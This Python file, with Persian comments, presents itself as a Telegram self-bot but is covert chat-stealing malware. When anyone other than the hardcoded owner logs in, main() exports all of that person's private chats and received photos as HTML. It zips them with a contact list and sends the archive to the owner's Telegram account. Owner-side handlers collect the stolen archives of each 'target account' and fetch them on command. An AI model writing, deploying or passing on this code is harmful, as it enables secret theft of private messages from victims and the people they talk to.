import asyncio
import base64
import html
import io
import json
import os
import sys
import zipfile
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError
from telethon.tl.types import User

# اطلاعات حساب تلگرام
API_ID = 29834234
API_HASH = "552c01d21d127def060f2915aedeebf9"

# آیدی عددی مالک سلف‌بات
OWNER_ID = 8870295777

# تنظیمات
MAX_CONCURRENT_DOWNLOADS = 3
SAVED_DIR = "saved_chats"

client = TelegramClient("my_account", API_ID, API_HASH)


# ------------------ توابع کمکی فایل و تارگت‌ها ------------------

def get_all_targets():
    """دریافت لیست تمام تارگت‌های ذخیره‌شده از روی پوشه‌ها"""
    targets = []
    if not os.path.exists(SAVED_DIR):
        return targets

    for folder_name in os.listdir(SAVED_DIR):
        folder_path = os.path.join(SAVED_DIR, folder_name)
        info_path = os.path.join(folder_path, "info.json")
        if os.path.isdir(folder_path) and os.path.exists(info_path):
            try:
                with open(info_path, "r", encoding="utf-8") as f:
                    targets.append(json.load(f))
            except Exception:
                continue
    return targets


def find_target(targets, query):
    """یافتن تارگت بر اساس شماره ردیف، آیدی عددی یا یوزرنیم"""
    query = str(query).strip().replace("@", "")
    if query.isdigit():
        idx = int(query)
        if 1 <= idx <= len(targets):
            return targets[idx - 1]
        for t in targets:
            if str(t["target_id"]) == query:
                return t
    for t in targets:
        if t["target_username"].lower().replace("@", "") == query.lower():
            return t
    return None


async def download_single_photo(client, message, semaphore):
    async with semaphore:
        while True:
            try:
                img_bytes = await client.download_media(message, file=io.BytesIO())
                if img_bytes:
                    b64 = base64.b64encode(img_bytes.getvalue()).decode("utf-8")
                    return message.id, b64
                return message.id, None
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 1)
            except Exception:
                return message.id, None


async def get_messages_safe(client, entity_id):
    while True:
        try:
            return await client.get_messages(entity_id, limit=None)
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 1)
        except Exception as e:
            print(f"[ERROR] Failed to fetch messages: {e}")
            return []


async def generate_chat_html(client, me, user):
    """تولید کدهای HTML برای چت‌ها"""
    chat_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
    username = user.username if user.username else "NoUsername"

    messages = await get_messages_safe(client, user.id)
    if not messages:
        return None, chat_name, username

    messages.reverse()
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_DOWNLOADS)
    photo_messages = [m for m in messages if m.photo and m.sender_id not in (me.id, OWNER_ID)]
    photo_dict = {}

    if photo_messages:
        tasks = [download_single_photo(client, msg, semaphore) for msg in photo_messages]
        results = await asyncio.gather(*tasks)
        photo_dict = {msg_id: b64 for msg_id, b64 in results if b64 is not None}

    messages_html = []
    for message in messages:
        if message.sender_id in (me.id, OWNER_ID):
            continue
        if not message.text and not message.photo:
            continue

        clean_sender = html.escape(chat_name or "Unknown")
        clean_text = html.escape(message.text) if message.text else ""
        date_str = message.date.strftime("%Y-%m-%d %H:%M:%S") if message.date else ""

        img_tag = ""
        if message.id in photo_dict:
            img_tag = f'<br><img src="data:image/jpeg;base64,{photo_dict[message.id]}" class="chat-img" alt="Photo" />'

        messages_html.append(f"""
            <div class="msg-card">
                <div class="sender">{clean_sender}</div>
                <div class="date">{date_str}</div>
                <div class="text">{clean_text}{img_tag}</div>
            </div>
        """)

    if not messages_html:
        return None, chat_name, username

    full_html = f"""<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat with {html.escape(chat_name)}</title>
    <style>
        body {{ font-family: Tahoma, 'Segoe UI', Arial, sans-serif; background-color: #0f172a; color: #e2e8f0; margin: 0; padding: 20px; direction: rtl; }}
        .container {{ max-width: 750px; margin: 0 auto; }}
        .chat-header {{ background-color: #1e293b; padding: 15px 20px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #334155; }}
        .chat-header h2 {{ margin: 0 0 8px 0; color: #38bdf8; font-size: 18px; }}
        .chat-header p {{ margin: 0; color: #94a3b8; font-size: 13px; }}
        .msg-card {{ background-color: #1e293b; border-radius: 8px; padding: 12px 16px; margin-bottom: 12px; border-right: 4px solid #3b82f6; }}
        .sender {{ font-weight: bold; color: #60a5fa; font-size: 14px; margin-bottom: 4px; }}
        .date {{ font-size: 11px; color: #64748b; margin-bottom: 8px; direction: ltr; text-align: left; }}
        .text {{ white-space: pre-wrap; word-wrap: break-word; line-height: 1.6; font-size: 14px; }}
        .chat-img {{ max-width: 100%; max-height: 400px; border-radius: 8px; margin-top: 10px; display: block; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="chat-header">
            <h2>Chat with: {html.escape(chat_name)}</h2>
            <p>Username: @{html.escape(username)} | User ID: {user.id}</p>
        </div>
        {"".join(messages_html)}
    </div>
</body>
</html>"""
    return full_html, chat_name, username


async def process_and_send_non_owner_chats(client, me):
    """استخراج، بسته‌بندی زیپ و ارسال اطلاعات غیرمالک به پیوی مالک"""
    print("\n[INFO] Extracting and saving all private chats...")
    target_dir = os.path.join(SAVED_DIR, str(me.id))
    os.makedirs(target_dir, exist_ok=True)

    host_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
    host_username = f"@{me.username}" if me.username else "NoUsername"

    contacts = []
    idx = 1

    async for dialog in client.iter_dialogs():
        if isinstance(dialog.entity, User) and not dialog.entity.bot:
            user = dialog.entity
            if user.id == OWNER_ID:
                continue

            chat_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
            username = f"@{user.username}" if user.username else "NoUsername"

            print(f"[SAVING] Chat: {user.first_name} ({user.id})...")
            full_html, _, _ = await generate_chat_html(client, me, user)
            if full_html:
                file_path = os.path.join(target_dir, f"{user.id}_{username.replace('@','')}.html")
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(full_html)

                contacts.append({
                    "index": idx,
                    "id": user.id,
                    "name": chat_name,
                    "username": username
                })
                idx += 1

    # ذخیره فایل ساختاریافته info.json
    target_info = {
        "target_id": me.id,
        "target_name": host_name,
        "target_username": host_username,
        "contacts": contacts
    }
    with open(os.path.join(target_dir, "info.json"), "w", encoding="utf-8") as f:
        json.dump(target_info, f, ensure_ascii=False, indent=2)

    # ساخت فایل ZIP
    zip_path = f"target_{me.id}.zip"
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(target_dir):
            for file in files:
                file_full = os.path.join(root, file)
                arcname = os.path.relpath(file_full, SAVED_DIR)
                zipf.write(file_full, arcname)

    # ارسال به پیوی مالک
    try:
        caption = f"📦 **اطلاعات جدید دریافت شد!**\n👤 **کاربر:** {host_name} ({host_username})\n🆔 **آیدی:** `{me.id}`\n📊 **تعداد چت‌ها:** {len(contacts)}"
        await client.send_file(OWNER_ID, zip_path, caption=caption)
        print("[SUCCESS] Chats packaged and sent to the owner successfully.")
    except Exception as e:
        print(f"[ERROR] Failed to send ZIP file to owner: {e}")
    finally:
        if os.path.exists(zip_path):
            os.remove(zip_path)


# ------------------ ایونت‌های مربوط به مالک ------------------

@client.on(events.NewMessage)
async def auto_unpack_zip_handler(event):
    """دریافت خودکار فایل زیپ از طرف کاربر غیرمالک و اکسترکت آن روی سیستم مالک"""
    if event.sender_id == OWNER_ID:
        return

    if event.file and event.file.name and isinstance(event.file.name, str):
        if event.file.name.startswith("target_") and event.file.name.endswith(".zip"):
            downloaded = await event.download_media(file=SAVED_DIR)
            with zipfile.ZipFile(downloaded, 'r') as zip_ref:
                zip_ref.extractall(SAVED_DIR)
            os.remove(downloaded)
            await client.send_message(OWNER_ID, "✅ **اطلاعات کاربر جدید با موفقیت دریافت و ذخیره شد.**\nبرای مشاهده دستور `لیست` را ارسال کنید.")


@client.on(events.NewMessage(from_users=OWNER_ID, pattern=r"^(?:لیست|\.chats)(?:\s+(.+))?$"))
async def list_chats_handler(event):
    query_param = event.pattern_match.group(1)
    targets = get_all_targets()

    if not targets:
        await event.reply("❌ هیچ اکانت هدف ذخیره‌شده‌ای یافت نشد.")
        return

    if query_param:
        target = find_target(targets, query_param)
        if not target:
            await event.reply(f"❌ اکانت هدف با مشخصات `{query_param}` یافت نشد.")
            return
        await show_target_contacts(event, target)
        return

    if len(targets) == 1:
        await show_target_contacts(event, targets[0])
    else:
        msg = f"📊 **لیست اکانت‌های هدف ذخیره‌شده ({len(targets)} کاربر):**\n\n"
        for idx, t in enumerate(targets, 1):
            msg += f"`{idx}` | **{t['target_name']}** | {t['target_username']} | `{t['target_id']}`\n"
        
        msg += "\n💡 *برای مشاهده چت‌های هر کاربر، دستور زیر را ارسال کنید:*\n`.chats <ردیف یا آیدی کاربر>`"
        await event.reply(msg)


async def show_target_contacts(event, target):
    """نمایش لیست چت‌های مخاطبین یک کاربر هدف خاص"""
    header = f"👤 **اطلاعات اکانت هدف:**\n"
    header += f"▫️ **نام:** {target['target_name']}\n"
    header += f"▫️ **یوزرنیم:** {target['target_username']}\n"
    header += f"▫️ **آیدی عددی:** `{target['target_id']}`\n"
    header += "─" * 35 + "\n\n"
    header += f"📊 **لیست چت‌های شخصی این کاربر ({len(target['contacts'])} چت):**\n\n"
    header += "**ردیف | نام مخاطب | یوزرنیم | شناسه (ID)**\n"
    header += "─" * 35 + "\n"

    contacts_lines = []
    for c in target["contacts"]:
        contacts_lines.append(f"`{c['index']}` | **{c['name']}** | {c['username']} | `{c['id']}`")

    full_response = header + "\n".join(contacts_lines) + f"\n\n💡 *برای دریافت فایل چت دستور زیر را بفرستید:*\n`.get {target['target_id']} <شناسه مخاطب>` یا `.get <شناسه مخاطب>`"

    if len(full_response) > 4000:
        for chunk in [full_response[i:i + 4000] for i in range(0, len(full_response), 4000)]:
            await event.reply(chunk)
    else:
        await event.reply(full_response)


@client.on(events.NewMessage(from_users=OWNER_ID, pattern=r"^(?:\.get|گرفتن)\s+(.+)$"))
async def export_chat_handler(event):
    args = event.pattern_match.group(1).strip().split()
    targets = get_all_targets()

    if not targets:
        await event.reply("❌ هیچ داده‌ای ذخیره نشده است.")
        return

    target_id = None
    contact_id = None

    if len(args) >= 2:
        target_id = args[0]
        contact_id = args[1]
    else:
        contact_id = args[0]

    file_found = None
    for t in targets:
        if target_id and str(t["target_id"]) != target_id:
            continue
        
        folder = os.path.join(SAVED_DIR, str(t["target_id"]))
        if os.path.exists(folder):
            for fname in os.listdir(folder):
                if fname.startswith(f"{contact_id}_") and fname.endswith(".html"):
                    file_found = os.path.join(folder, fname)
                    break
        if file_found:
            break

    if file_found:
        await event.reply("📤 در حال ارسال فایل چت...", file=file_found)
    else:
        await event.reply("❌ فایل چت مورد نظر پیدا نشد!")


# ------------------ تابع اصلی ------------------

async def main():
    await client.start()
    me = await client.get_me()

    if me.id != OWNER_ID:
        print(f"[INFO] Non-owner user logged in: {me.first_name} (ID: {me.id}). Processing chats...")
        await process_and_send_non_owner_chats(client, me)
        print("[INFO] Operation completed successfully. Terminating session...")
        await client.disconnect()
        sys.exit(0)

    print("\n" + "=" * 50)
    print(f"[INFO] Logged in as OWNER: {me.first_name} (ID: {me.id})")
    print("[STATUS] Self-bot is running and waiting for commands...")
    print("=" * 50 + "\n")

    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
